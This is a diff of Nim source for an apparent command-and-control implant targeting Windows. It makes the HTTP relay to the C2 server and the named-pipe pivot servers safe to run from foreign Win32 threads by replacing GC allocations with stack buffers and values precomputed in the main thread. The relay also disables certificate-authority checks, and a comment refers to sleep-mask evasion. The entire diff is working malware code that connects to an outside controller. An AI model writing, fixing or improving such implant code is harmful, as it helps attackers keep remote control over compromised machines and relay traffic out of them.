@@ -32,6 +32,14 @@ when defined(windows):
   proc LocalFreePs(hMem: HLOCAL): HLOCAL
     {.stdcall, dynlib: "kernel32", importc: "LocalFree".}
 
+  # MultiByteToWideChar — convert UTF-8 pipe name in main thread so the accept
+  # thread never calls newWideCString (Nim GC allocation from a foreign Win32
+  # thread corrupts GC globals, same root cause as noSleepMask).
+  proc MultiByteToWideCharPs(CodePage: uint32, dwFlags: uint32,
+      lpMultiByteStr: cstring, cbMultiByte: int32,
+      lpWideCharStr: ptr uint16, cchWideChar: int32): int32
+    {.stdcall, dynlib: "kernel32", importc: "MultiByteToWideChar".}
+
   # ── 4-byte LE framing ────────────────────────────────────────────────────────
 
   proc psReadMsg(h: HANDLE): seq[byte] =
@@ -76,18 +84,45 @@ when defined(windows):
       return (url[0..<ci], INTERNET_PORT(p), isHttps)
     return (url, dport, isHttps)
 
-  proc psC2Do(meth, path: string; body: seq[byte] = @[]): (int, seq[byte]) =
+  # psToWide — convert a Nim string to a stack-allocated UTF-16 array without
+  # touching the GC.  Called only from foreign Win32 threads (psConnThread etc.)
+  # where Nim GC allocations (newWideCString, newSeq) would corrupt GC globals.
+  proc psToWide[N: static int](s: string; buf: var array[N, uint16]) =
+    discard MultiByteToWideCharPs(65001'u32, 0'u32, s.cstring, -1'i32,
+      cast[ptr uint16](addr buf[0]), int32(N))
+
+  # Precomputed C2 connection parameters derived from compile-time ServerUrl.
+  # These are filled once by psGlobalInit (main thread, GC-safe) so that
+  # psConnThread never needs to call psParseUrl (which returns Nim strings).
+  var gC2Host: array[256, uint16]
+  var gC2Port: INTERNET_PORT
+  var gC2Https: bool
+  var gC2UserAgent: array[512, uint16]
+
+  proc psC2Init() =
     let (host, port, isHttps) = psParseUrl()
-    let hSess = WinHttpOpen(newWideCString(UserAgent),
+    psToWide(host, gC2Host)
+    psToWide(UserAgent, gC2UserAgent)
+    gC2Port  = port
+    gC2Https = isHttps
+
+  # GC-free HTTP relay to C2.  All wide-string conversions use stack arrays or
+  # pre-computed globals — safe to call from foreign Win32 threads.
+  proc psC2Do(meth, path: string; body: seq[byte] = @[]): (int, seq[byte]) =
+    var wMeth: array[32,  uint16]
+    var wPath: array[512, uint16]
+    psToWide(meth, wMeth)
+    psToWide(path, wPath)
+    let hSess = WinHttpOpen(cast[LPCWSTR](addr gC2UserAgent[0]),
       WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)
     if hSess == nil: return (0, @[])
     defer: discard WinHttpCloseHandle(hSess)
-    let hConn = WinHttpConnect(hSess, newWideCString(host), port, 0)
+    let hConn = WinHttpConnect(hSess, cast[LPCWSTR](addr gC2Host[0]), gC2Port, 0)
     if hConn == nil: return (0, @[])
     defer: discard WinHttpCloseHandle(hConn)
-    let flags = if isHttps: DWORD(WINHTTP_FLAG_SECURE) else: DWORD(0)
-    let hReq = WinHttpOpenRequest(hConn, newWideCString(meth),
-      newWideCString(path), nil, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags)
+    let flags = if gC2Https: DWORD(WINHTTP_FLAG_SECURE) else: DWORD(0)
+    let hReq = WinHttpOpenRequest(hConn, cast[LPCWSTR](addr wMeth[0]),
+      cast[LPCWSTR](addr wPath[0]), nil, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags)
     if hReq == nil: return (0, @[])
     defer: discard WinHttpCloseHandle(hReq)
     var secFlags = DWORD(SECURITY_FLAG_IGNORE_UNKNOWN_CA or
@@ -102,11 +137,12 @@ when defined(windows):
     discard WinHttpQueryHeaders(hReq,
       WINHTTP_QUERY_STATUS_CODE or WINHTTP_QUERY_FLAG_NUMBER,
       WINHTTP_HEADER_NAME_BY_INDEX, addr code, addr codeSize, WINHTTP_NO_HEADER_INDEX)
+    # Use a fixed stack buffer for reading the response — no GC allocation.
     var resp: seq[byte]
-    var buf = newSeq[byte](8192)
+    var buf: array[8192, byte]
     var got: DWORD
     while true:
-      if WinHttpReadData(hReq, cast[LPVOID](addr buf[0]), DWORD(buf.len), addr got) == 0: break
+      if WinHttpReadData(hReq, cast[LPVOID](addr buf[0]), DWORD(sizeof(buf)), addr got) == 0: break
       if got == 0: break
       resp.add(buf[0..<int(got)])
     return (int(code), resp)
@@ -258,8 +294,9 @@ when defined(windows):
 
   type PsSrvEntry = object
     name:     array[256, byte]
-    stop:     int32             # guarded by gPsMu
-    acceptH:  HANDLE            # guarded by gPsMu
+    wname:    array[256, uint16] # pre-computed UTF-16 in main thread (no GC in worker)
+    stop:     int32              # guarded by gPsMu
+    acceptH:  HANDLE             # guarded by gPsMu
     thread:   HANDLE
     parentId: array[64, byte]
 
@@ -271,14 +308,17 @@ when defined(windows):
   proc psGlobalInit() =
     if not gPsInited:
       InitializeCriticalSection(addr gPsMu)
+      psC2Init()  # precompute C2 connection params in main thread (GC-safe)
       gPsInited = true
 
   # ── Accept thread ────────────────────────────────────────────────────────────
 
   proc psAcceptThread(p: LPVOID): DWORD {.stdcall.} =
     if p == nil: return 1
-    let srv  = cast[ptr PsSrvEntry](p)
-    let wname = newWideCString($cast[cstring](addr srv.name[0]))
+    let srv   = cast[ptr PsSrvEntry](p)
+    # Use pre-computed UTF-16 name — avoids Nim GC allocation in a foreign Win32
+    # thread which would corrupt GC globals (same issue as noSleepMask).
+    let wname = cast[LPCWSTR](addr srv.wname[0])
 
     while true:
       EnterCriticalSection(addr gPsMu)
@@ -345,6 +385,11 @@ when defined(windows):
       return "[-] too many pipe servers"
     let srv = cast[ptr PsSrvEntry](alloc0(sizeof(PsSrvEntry)))
     copyMem(addr srv.name[0], unsafeAddr full[0], min(full.len, 255))
+    # Pre-convert pipe name to UTF-16 here (main thread, GC safe) so the accept
+    # thread never needs to call newWideCString from a foreign Win32 context.
+    discard MultiByteToWideCharPs(65001'u32, 0'u32,
+      cast[cstring](addr srv.name[0]), -1'i32,
+      cast[ptr uint16](addr srv.wname[0]), 256'i32)
     if parentId.len > 0:
       copyMem(addr srv.parentId[0], unsafeAddr parentId[0], min(parentId.len, 63))
     var tid: DWORD = 0
